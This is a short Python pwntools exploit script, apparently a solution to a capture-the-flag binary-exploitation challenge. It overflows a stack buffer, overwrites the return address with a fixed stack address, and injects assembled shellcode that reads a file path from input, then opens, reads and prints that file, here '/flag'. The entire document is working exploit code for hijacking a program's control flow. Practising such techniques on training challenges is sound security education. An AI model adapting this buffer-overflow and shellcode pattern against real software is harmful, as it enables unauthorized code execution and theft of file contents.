from pwn import *

context.arch = 'amd64'

p = process('/challenge/binary-exploitation-hijack-to-shellcode-w')

shellcode = asm('''
    mov r9, 0x405010

    mov rdi, 0
    mov rsi, r9
    mov rdx, 0x100
    mov rax, 0
    syscall

    mov rdi, r9
    mov rsi, 0
    mov rdx, 0
    mov rax, 2
    syscall

    mov rdi, rax
    mov rsi, r9
    mov rdx, 0x100
    mov rax, 0
    syscall

    mov rdi, 1
    mov rsi, r9
    mov rdx, 0x100
    mov rax, 1
    syscall
''')

payload = b'A' * 0x28
payload += p64(0x7fffffffda40)
payload += shellcode

p.send(payload)
p.send(b'/flag\x00')

p.interactive()
